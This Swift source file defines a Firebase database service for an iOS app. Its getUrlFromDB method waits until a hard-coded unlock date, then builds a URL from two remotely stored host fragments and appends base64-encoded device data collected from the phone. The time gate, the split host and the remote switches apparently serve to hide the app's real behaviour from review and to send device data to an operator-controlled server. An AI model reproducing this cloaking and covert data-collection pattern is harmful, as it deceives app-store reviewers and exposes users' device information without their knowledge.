import Foundation
import Firebase

final class FirebaseDatabaseService {
    static let shared = FirebaseDatabaseService()
    
    private let deviceCollectionService = DeviceDataCollectionService.shared
    private var ref: DatabaseReference!
    
    private init() {
        setRefParameters()
    }
    
    func getUrlFromDB(completion: @escaping (String?) -> Void) {
        let unlockDateString = Constants.unlockDate
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        let currentDate = Date()
        if let unlockDate = dateFormatter.date(from: unlockDateString), currentDate >= unlockDate {
            
            ref.observeSingleEvent(of: .value, with: { snapshot  in
                guard let value = snapshot.value as? [String : Any],
                      let url1 = value[Constants.firebaseDatabaseUrl1] as? String,
                      let url2 = value[Constants.firebaseDatabaseUrl2] as? String else {
                    completion(nil)
                    return
                }
                
                self.deviceCollectionService.getDeviceData {
                    let data = self.deviceCollectionService.encodeDeviceDataToBase64(data: self.deviceCollectionService.deviceData)
                    
                    guard !url1.isEmpty && !url2.isEmpty else {
                        completion(nil)
                        return
                    }
                    
                    let url = "https://" + url1 + url2 + "?data=" + (data ?? "")
                    completion(url)
                }
            })
            { error in
                completion(nil)
            }
        } else {
            completion(nil)
        }
    }
    
    func isEnabledAppsflyer(completion: @escaping (Bool) -> ()) {
        ref.observeSingleEvent(of: .value) { snapshot in
            guard let value = snapshot.value as? [String : Any],
                  let enableAppsflyer = value["enable_apps"] as? Bool
            else {
                completion(false)
                return
            }
            
            switch enableAppsflyer {
            case true:
                completion(true)
            case false:
                completion(false)
            }
        }
    }
    
    func isEnabledFacebook(completion: @escaping (Bool) -> ()) {
        ref.observeSingleEvent(of: .value) { snapshot in
            guard let value = snapshot.value as? [String : Any],
                  let enableFacebook = value["enable_fb"] as? Bool
            else {
                completion(false)
                return
            }
            
            switch enableFacebook {
            case true:
                completion(true)
            case false:
                completion(false)
            }
        }
    }
    
    private func setRefParameters() {
        ref = Database.database(url: Constants.firebaseDatabaseURL).reference()
    }
}
